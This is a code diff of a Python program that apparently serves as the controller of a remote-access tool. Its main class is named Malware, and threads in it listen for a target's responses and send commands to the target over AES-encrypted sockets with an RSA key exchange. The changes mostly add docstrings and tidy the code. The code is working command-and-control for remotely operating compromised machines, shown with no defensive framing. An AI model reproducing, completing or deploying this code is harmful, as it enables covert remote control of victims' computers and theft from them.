@@ -8,8 +8,6 @@ import base64
 import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
-#from Crypto.Util.Padding import pad
-#from Crypto.Util.Padding import unpad
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
@@ -31,13 +29,16 @@ def print_help():
 
 
 class AESCipher(object):
-
+    """
+        AES module by mnothic (https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
+        Modified to use CFB AES encryption as CBC wasn't working on Linux (in the case of big responses from target)
+        """
     def __init__(self, key):
         self.bs = 32
         self.key = hashlib.sha256(key.encode()).digest()
 
     def encrypt(self, raw):
-        raw = self.pad(raw, self.bs)
+        raw = self.pad(raw)
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(self.key, AES.MODE_CFB, iv)
         return base64.b64encode(iv + cipher.encrypt(raw))
@@ -46,18 +47,22 @@ class AESCipher(object):
         enc = base64.b64decode(enc)
         iv = enc[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CFB, iv)
-        return self.unpad(cipher.decrypt(enc[AES.block_size:]), self.bs).decode('utf-8')
+        return self.unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
 
-    def pad(self, mess, bs):
+    def pad(self, mess):
         length = 16 - (len(mess) % 16)
         mess += bytes([length]) * length
         return mess
 
-    def unpad(self, mess, bs):
+    def unpad(self, mess):
         return mess[:-mess[-1]]
 
 
 class InThread(threading.Thread):
+    """
+    Invoked by Malware Thread
+    Receives the target's responses
+    """
     def __init__(self, ip, key, aes, in_port=IN_PORT):
         super().__init__()
         self.in_port = in_port
@@ -69,7 +74,7 @@ class InThread(threading.Thread):
             self.socket = socket.socket()
             self.socket.bind(('', self.in_port))
             self.socket.listen(1)
-            print('listening for incoming connections')
+            print('Listening for incoming connections')
 
             self.conn, self.in_ip = self.socket.accept()
             print('Connection received from {} on port {}'.format(self.in_ip[0], self.in_ip[1]))
@@ -82,7 +87,6 @@ class InThread(threading.Thread):
     def run(self):
         again = True
         while again:
-            #msg = self.rsa_decrypt(self.conn.recv(1024)).decode('UTF-8')
             msg = self.aes.decrypt(self.conn.recv(32768))
             if msg == 'exit':
                 again = False
@@ -91,7 +95,6 @@ class InThread(threading.Thread):
         self.stop()
 
     def stop(self):
-        #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
 
         print('Closed socket coming from {}:{}'.format(self.in_ip[0], self.in_ip[1]))
@@ -101,23 +104,25 @@ class InThread(threading.Thread):
             remote_public_key_pem = self.conn.recv(1024)
             global remote_public_key
             remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
-            print("Remote public key successfully loaded")
+            print('Remote public key successfully loaded')
         except socket.timeout:
             self.init_public_key()
         except ValueError:
-            print("Invalid Public Key received")
+            print('Invalid Public Key received')
 
-    # Used to be called decrypt
-    def rsa_decrypt(self,ciphertext):
+    def rsa_decrypt(self, ciphertext):
         global private_key
-        return private_key.decrypt(ciphertext,
-                                padding.OAEP(
+        return private_key.decrypt(ciphertext, padding.OAEP(
                                     mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                     algorithm=hashes.SHA256(),
                                     label=None))
 
 
 class OutThread(threading.Thread):
+    """
+    Invoked by Malware Thread
+    Sends commands to the target
+    """
     def __init__(self, ip, out_port: int, key, aes):
         super().__init__()
         self.ip = ip
@@ -173,11 +178,11 @@ class OutThread(threading.Thread):
 
     def send(self, message):
         try:
-            #self.sock.sendall(self.rsa_encrypt(message.encode('UTF-8')))
             self.sock.sendall(self.aes.encrypt(message.encode('UTF-8')))
         except ConnectionError:
             print('Unable to send <<{}>> to {}'.format(message, self.ip))
 
+    # Function sends the AES key, encrypted using RSA keys
     def sendkey(self):
         try:
             self.sock.send(self.rsa_encrypt(self.key.encode('UTF-8')))
@@ -192,17 +197,19 @@ class OutThread(threading.Thread):
             print("Unable to connect to {}:{}".format(self.destination[0], self.destination[1]))
             self.send_public_keys()
 
-    # Method used to be called encrypt
     def rsa_encrypt(self, message):
         global remote_public_key
-        return remote_public_key.encrypt(message,
-                                         padding.OAEP(
+        return remote_public_key.encrypt(message, padding.OAEP(
                                              mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                              algorithm=hashes.SHA256(),
                                              label=None))
 
 
 class Malware():
+    """
+    Main Thread : invokes IN & OUT Threads
+    Generates RSA & AES keys
+    """
     def __init__(self, ip, out_port=OUT_PORT, in_port=IN_PORT):
         self.ip = ip
         self.out_port = out_port
@@ -237,8 +244,8 @@ class Malware():
 
     def generate_rsa_keys(self):
         return rsa.generate_private_key(backend=default_backend(),
-                                               public_exponent=65537,
-                                               key_size=2048)
+                                        public_exponent=65537,
+                                        key_size=2048)
 
     def serialize_public_key(self,public_key):
         return public_key.public_bytes(
@@ -247,7 +254,7 @@ class Malware():
 
 
 """
-Checks if argument is valid and Invokes Malware Thread
+Checks if argument is valid then Invokes Malware Thread
 """
 if len(sys.argv) == 2:
     ip = sys.argv[1]
